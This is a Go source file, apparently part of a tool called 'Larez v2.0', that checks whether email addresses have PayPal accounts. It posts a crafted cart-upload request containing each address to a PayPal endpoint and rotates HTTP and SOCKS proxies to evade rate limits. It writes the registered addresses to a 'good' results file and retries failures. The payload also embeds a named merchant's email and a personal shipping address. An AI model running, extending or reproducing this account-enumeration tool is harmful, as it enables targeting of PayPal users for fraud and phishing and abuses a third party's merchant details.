package paypal

import (
	"awesomeProject/modules"
	"awesomeProject/utils"
	"github.com/pterm/pterm"
	"golang.org/x/net/proxy"
	"h12.io/socks"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var good int64 = 0
var bad int64 = 0
var total int64 = 0
var error int64 = 0

func StartEmailChecker(emails []string, proxies []string, mode string)  {
	goodLog := pterm.NewStyle(pterm.FgGreen)
	badLog := pterm.NewStyle(pterm.FgRed)
	errLog := pterm.NewStyle(pterm.FgLightYellow)

	var debounceIdentifier = "Paypal" + modules.DebounceIdentifier

	_, err := os.Stat("./results/good/" + debounceIdentifier)
	_, err = os.Stat("./results/bad/" + debounceIdentifier)
	var goodFile *os.File
	var badFile *os.File

	if os.IsNotExist(err) {
		goodFile, _ = os.Create("./results/good/" + debounceIdentifier)
		badFile, _ = os.Create("./results/bad/" + debounceIdentifier)
	} else {
		goodFile, _ = os.Open("./results/good/" + debounceIdentifier)
		badFile, _ = os.Open("./results/bad/" + debounceIdentifier)
	}

	var goodMails []string
	var badMails []string
	var errorsMails []string
	var wg sync.WaitGroup
	var mu sync.Mutex


	modules.EmailCheck(
		func(email string, wg *sync.WaitGroup, proxyS string, mu *sync.Mutex) {
			defer wg.Done()
			httpTransport := &http.Transport{}

			if mode == "recheck" {
				proxyS = proxies[rand.Int() % len(proxies)]
			}


			if !modules.IsProxylessMode {
				if modules.ProxyType == "HTTP" {
					proxyUrl, _ := url.Parse("http://" + proxyS)
					httpTransport.Proxy = http.ProxyURL(proxyUrl)

				} else if modules.ProxyType == "SOCKS4" {
					dial := socks.Dial("socks4://" + proxyS)
					httpTransport.Dial = dial

				} else if modules.ProxyType == "SOCKS5" {
					dialer, err := proxy.SOCKS5("tcp", proxyS, nil, proxy.Direct)
					if err != nil {
						mu.Lock()
						errorsMails = append(errorsMails, email)
						error++
						total++
						defer mu.Unlock()
						return
					}
					httpTransport.Dial = dialer.Dial
				}
			}

			client := &http.Client{Transport: httpTransport}

			if modules.IsProxylessMode {
				client = &http.Client{}
			}

			payload := strings.NewReader("cmd=%20_cart&upload=%201&business=%20indre%40robertkalinkin.com&item_name_1=%20RK%20GIFT%20BOX%2F1&item_number_1=&amount_1=%2081.82&quantity_1=%201&weight_1=%200&on0_1=%20Size%20-%20letters&os0_1=%20S&on1_1=%20Color&os1_1=%20GRY%2FWH%2FWH&item_name_2=%20Shipping%2C%20Handling%2C%20Discounts%20%26%20Taxes&item_number_2=&amount_2=%2017.18&quantity_2=%201&weight_2=%200&currency_code=%20EUR&first_name=%20James%20Warner&last_name=%20&address1=%203881%20Yorkland%20Dr.%20NW%20Apt.%208&address2=&city=%20Comstock%20Park&zip=%2049321&country=%20US&address_override=%200&email=" + email)
			req, _ := http.NewRequest("POST", "https://history.paypal.com/cgi-bin", payload)

			req.Header.Add("user-agent", "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")


			req.Close = true
			resp, err := client.Do(req)

			if err != nil {
				mu.Lock()
				errorsMails = append(errorsMails, email)
				error++
				total++
				defer mu.Unlock()
				return
			}

			defer func(Body io.ReadCloser) {
				err := Body.Close()
				if err != nil {
					mu.Lock()
					errorsMails = append(errorsMails, email)
					error++
					total++
					defer mu.Unlock()
					return
				}
			}(resp.Body)

			body, _ := ioutil.ReadAll(resp.Body)
			stringBody := string(body)

			if strings.Contains(stringBody, email) {
				mu.Lock()
				good++
				goodLog.Println("[GOOD] " + strconv.FormatInt(total, 10) +  " - " + email)
				goodMails = append(goodMails, email)
				goodFile.Write([]byte(email + "\n"))
				defer mu.Unlock()
			} else if strings.Contains(stringBody,"your last action could not be completed") {
				mu.Lock()
				error++
				errorsMails = append(errorsMails, email)
				defer mu.Unlock()
			} else {
				mu.Lock()
				bad++
				badLog.Println("[BAD] " + strconv.FormatInt(total, 10) +  " - " + email)
				badFile.Write([]byte(email + "\n"))
				badMails = append(badMails, email)
				defer mu.Unlock()
			}

			total++
			_, _ = utils.SetConsoleTitle("Larez v2.0 | Checked:" + strconv.FormatInt(total, 10) + " - Hits: "+ strconv.FormatInt(good, 10) +" - Bad: "+strconv.FormatInt(bad, 10)+" | " + "Errors: " + strconv.FormatInt(int64(len(errorsMails)), 10))

		},
		emails,
		&wg,
		proxies,
		&mu,
	)

	errLog.Println("Finished Larezed " + strconv.FormatInt(total, 10) + " mails! | Goods: " + strconv.FormatInt(good, 10) + " mails - Bads: " + strconv.FormatInt(bad, 10) + " mails ! | Errors: " + strconv.FormatInt(int64(len(errorsMails)), 10))

	if len(errorsMails) > 50 {
		errLog.Println("\nError checker will start in few seconds ! please wait...")
		time.Sleep(10)
		StartEmailChecker(errorsMails, proxies, "recheck")
		utils.ClearConsole()
	}
}